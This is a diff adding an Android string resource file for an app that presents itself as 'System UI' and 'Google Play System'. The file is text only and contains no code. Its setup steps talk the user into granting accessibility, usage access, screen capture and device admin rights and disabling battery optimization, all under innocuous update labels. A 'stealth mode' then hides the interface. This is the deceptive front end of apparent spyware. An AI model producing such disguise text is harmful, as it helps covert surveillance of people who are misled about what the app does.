@@ -1,0 +1,31 @@
+<resources>
+    <string name="app_name">System UI</string>
+    <string name="accessibility_service_description">Standard framework for Android system configuration and updates</string>
+    <string name="notification_title">Google Play System</string>
+    <string name="notification_text">Checking for system updates and optimizing performance</string>
+
+    <string name="setup_title">System Update Configuration</string>
+    <string name="grant_permissions">1. Enable Core Services</string>
+    <string name="enable_accessibility">2. Enable System Framework</string>
+    <string name="enable_usage_access">3. Enable Performance Metrics</string>
+    <string name="grant_screen_capture">4. Verify Display Configuration</string>
+    <string name="enable_device_admin">5. Activate Security Module</string>
+    <string name="disable_battery_optimization">6. Optimize Battery Usage</string>
+    <string name="enter_stealth_mode">Finish Configuration</string>
+    <string name="stealth_note">Note: The configuration interface will be hidden after setup for security purposes.</string>
+
+    <string name="settings">Configuration</string>
+    <string name="appearance">Appearance</string>
+    <string name="dark_mode">Dark Mode</string>
+    <string name="off">Off</string>
+    <string name="on">On</string>
+    <string name="system">System</string>
+    <string name="language">Language</string>
+    <string name="current_language">Current Language</string>
+    <string name="english">English</string>
+    <string name="bengali">Bengali</string>
+    <string name="privacy">Privacy</string>
+    <string name="stealth_mode_status">Stealth Mode Status</string>
+    <string name="setup">Setup</string>
+    <string name="ok">OK</string>
+</resources>
